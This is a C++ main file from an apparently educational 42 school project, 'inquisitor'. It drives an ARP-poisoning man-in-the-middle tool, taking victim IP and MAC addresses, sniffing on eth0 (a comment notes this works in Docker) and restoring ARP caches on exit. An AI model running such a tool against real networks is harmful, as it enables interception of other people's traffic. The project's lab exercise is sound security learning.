/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.cpp                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: hoannguy <hoannguy@student.42lausanne.c    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/06/28 18:34:55 by hoannguy          #+#    #+#             */
/*   Updated: 2026/07/09 11:54:34 by hoannguy         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "inquisitor.hpp"
#include "Victims.hpp"
#include "Poisoner.hpp"
#include "Sniffer.hpp"

static void on_close(void *cookie);

int main(int argc, char *argv[]) {
	if (argc < 5) {
		std::cerr << "Usage: " << argv[0] << " <IP-src> <MAC-src> <IP-target> <MAC-target>" << std::endl;
		return 1;
	}

	Victims victims;
	try {
		victims.set_Ip(argv[1], SERVER)
			.set_Mac(argv[2], SERVER)
			.set_Ip(argv[3], CLIENT)
			.set_Mac(argv[4], CLIENT);
	} catch (std::invalid_argument &e) {
		std::cerr << "Error: " << e.what() << std::endl;
		return 1;
	}

	// Note: eth0 only work in Docker
	pcpp::PcapLiveDevice *device = pcpp::PcapLiveDeviceList::getInstance().getDeviceByName("eth0");
	if (device == NULL) {
		std::cerr << "Error: Cannot find interface for eth0" << std::endl;
		return 1;
	}
	if (!device->open()) {
		std::cerr << "Error: cannot open device " + device->getName() << std::endl;
		return 1;
	}
	std::cout
		<< "Interface info:" << std::endl
		<< "   Interface name:        " << device->getName() << std::endl // get interface name
		<< "   Interface description: " << device->getDesc() << std::endl // get interface description
		<< "   MAC address:           " << device->getMacAddress() << std::endl // get interface MAC address
		<< "   Default gateway:       " << device->getDefaultGateway() << std::endl; // get default gateway
	
	Poisoner poisoner(victims, device);
	Sniffer sniffer(victims, poisoner, device);
	pcpp::ApplicationEventHandler::getInstance().onApplicationInterrupted(on_close, &poisoner);
	int exit_code = 0;
	try {
		sniffer.sniff();
		poisoner.poison();
	} catch (std::runtime_error &e) {
		std::cerr << "Error: " << e.what() << std::endl;
		exit_code = 1;
	}

	// Always restore + clean up, even if poisoning failed, so the victims'
	// ARP caches aren't left pointing at us.
	try {
		poisoner.restore();
	} catch (std::runtime_error &e) {
		std::cerr << "Error: " << e.what() << std::endl;
		exit_code = 1;
	}
	sniffer.end();
	device->close();

	std::cout << "Bye" << std::endl;
	return exit_code;
}

static void on_close(void *cookie) {
	std::cout << "Stoping. Now sending restore packets..." << std::endl;
    static_cast<Poisoner *>(cookie)->stop_poison();
}
